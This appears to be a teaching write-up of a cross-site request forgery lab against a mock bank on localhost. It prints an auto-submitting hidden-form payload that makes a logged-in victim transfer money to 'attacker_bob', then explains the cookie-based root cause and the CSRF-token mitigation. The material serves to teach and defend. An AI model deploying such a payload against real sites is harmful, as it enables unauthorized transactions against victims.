🦹 CSRF Exploit Payload Breakdown

This is the exact payload running on the attacker's server (http://localhost:4000/claim-prize):

<!-- Malicious Phishing Landing Page on Attacker Server (Port 4000) -->
<form id="csrfForm" action="http://localhost:3000/transfer" method="POST" style="display:none;">
  <input type="hidden" name="recipient" value="attacker_bob" />
  <input type="hidden" name="amount" value="1000" />
</form>

<script>
  // Automatically submits the POST request the instant the page loads!
  document.getElementById('csrfForm').submit();
</script>

How the Attack Works (Root Cause):

  1. Victim is Authenticated: Alice is logged in to Apex Bank on localhost:3000. Her browser holds the session cookie apex_vault_sid.
  2. Phishing Trap: Attacker tricks Alice into clicking an external link (e.g., claiming a prize) hosted on localhost:4000.
  3. Ambient Credentials: The auto-submitting form initiates a cross-origin POST request back to localhost:3000/transfer.
  4. Forged Action: The browser automatically includes Alice's valid session cookie. In Vulnerable Mode, the server fulfills the transfer because it fails to verify user intent!
  5. The Mitigation: In Mitigated Mode, the server requires a unique, unpredictable _csrf token. Since the attacker origin cannot read Alice's token due to the Same-Origin Policy (SOP), the exploit is rejected with 403 Forbidden!
